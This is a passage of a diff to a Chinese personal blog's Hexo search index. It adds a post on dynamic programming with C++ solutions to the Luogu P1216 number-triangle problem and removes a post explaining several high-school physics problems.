class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>算法</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+<span id="more"></span>
+
+<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
+<p>出自洛谷p1216</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94.png"></p>
+<p>具体要求如下：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94%E5%85%B7%E4%BD%93%E8%A6%81%E6%B1%82.png"></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>算法</category>
@@ -346,55 +402,6 @@
       <tags>
         <tag>语法</tag>
         <tag>markdown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>高中物理经典例题讲解</title>
-    <url>/2022/07/17/%E9%AB%98%E4%B8%AD%E7%89%A9%E7%90%86%E7%BB%8F%E5%85%B8%E4%BE%8B%E9%A2%98%E8%AE%B2%E8%A7%A3/</url>
-    <content><![CDATA[<p> 这里是几道经典高中物理题目的讲解。</p>
-<span id="more"></span>
-
-<h4 id="必修一"><a href="#必修一" class="headerlink" title="必修一"></a>必修一</h4><p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220717093027.jpg"></p>
-<p>解析：这是一道物理必修一的题目，拿到题目首先审题，研究的对象是汽车，运动开始的状态是<strong>静止</strong>，运动是<strong>匀加速</strong>运动，因此得出加速度不变。继续读题，可知A，B两点之间距离125m,且A，B两点所用时间为10秒，又知道B点速度。此时题目已经读完，整理一下已知条件：整个运动过程有三个点，分别是起始点O点，A点的树和B点的树。<strong>已知AB两点的距离，所用的时间和B点速度</strong>，又因为<strong>整个运动都是匀加速运动</strong>，因此，思路就可以整理为：<strong>先通过AB两点的数据，求出未知的加速度和A点的速度，再利用原点计算出运动到A点所用的时间</strong>。</p>
-<p>因此利用公式 $S=Vt+\frac{1}{2}at^2$ 和 $V=V0+at$ ，将AB两点的数据代入，联立方程组求解可以得出$a=0.5m/s^2$ 和$Va=10m/s^2$ 。这样就完成了加速度和A点速度的求解，再使用初速度为0的速度时间公式$V=at$ 可以求解出运动到A点所需的时间。答案$t=20s$。</p>
-<p>以上是常规思路求解，这里还有一种利用平均速度的方法，平均速度的利用在某些特定的题目可以快速得出答案，但是局限性以及思路可能没用那么容易想到。</p>
-<p>平均速度求A点速度方法如下：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220717095830.jpg"></p>
-<p>这样求A点平均速度的方法比常规思路会快一些。</p>
-<h4 id="必修二"><a href="#必修二" class="headerlink" title="必修二"></a>必修二</h4><p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220717093037.jpg"></p>
-<p>解析：这是一道平抛运动的题目，是必修二经典题目，</p>
-<p>首先审题：物体是从$5m$的高处水平抛出，分解速度和位移可以得出：<strong>水平方向上是不受外力的，因此做匀速运动。竖直方向上只受重力作用，因此做匀加速运动</strong>。平抛运动联系起水平运动和竖直运动的量是时间，<strong>在平抛运动中水平运动和竖直运动的时间是相等的</strong>。因此，思路就很明显了：<strong>首先通过竖直方向上的分运动求出时间，再利用求得的时间求出水平位移。</strong></p>
-<p>竖直方向上是很简单的初速度为0的匀加速运动：</p>
-<ul>
-<li><p>$$h=\frac{1}{2}at^2$$</p>
-</li>
-<li><p>代入数据求得时间为1s。</p>
-</li>
-<li><p>利用速度时间公式$$V=at$$求得落地竖直速度为$10m/s^2$。</p>
-</li>
-<li><p>由于水平方向上是一个匀速运动，直接$S=vt$求得位移为8m。</p>
-</li>
-</ul>
-<p>要注意的一个点是：第一问题目问的是落地速度的大小，而$10m/s^2$是竖直速度的大小，因此<strong>我们需要用水平方向的速度进行一次勾股定理的运算</strong>，最后得到的答案应该是$2\sqrt{41} m/s^2$。 </p>
-<h4 id="选修3-1"><a href="#选修3-1" class="headerlink" title="选修3-1"></a>选修3-1</h4><p>题目：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220717093040.jpg"></p>
-<p>首先审题：题目很简洁，给出一个电路图，内含有两个电阻，一个总路的电流表，两个开关分别控制支路和总路。题目意思要求电源电动势和电源内阻。给出了两种情况下的总电路电流，给出电阻值，因此可以得到思路：<strong>两种状态下肯定要分别分析并列出两个式子，并且联立方程解出答案</strong>，这是最常规的思路。<strong>又因为题目给出电阻和电流，思考使用闭合电路欧姆定律</strong>。</p>
-<p><strong>第一次状态下的方程：</strong></p>
-<ul>
-<li><p>$$E=I_1(R_1+r)$$</p>
-</li>
-<li><p>代入数据得到$$E=0.5(r+2)$$</p>
-</li>
-</ul>
-<p><strong>第二次状态下的方程</strong>：</p>
-<ul>
-<li>$$E=I_2(\frac{R_1R_2}{R1+R2}+r)$$</li>
-<li>代入数据得到E=0.75(r+1)</li>
-</ul>
-<p>解得答案即可:  $r=1$  ,  $E=\frac{3}{2}$。</p>
-]]></content>
-      <tags>
-        <tag>高中物理</tag>
       </tags>
   </entry>
 </search>
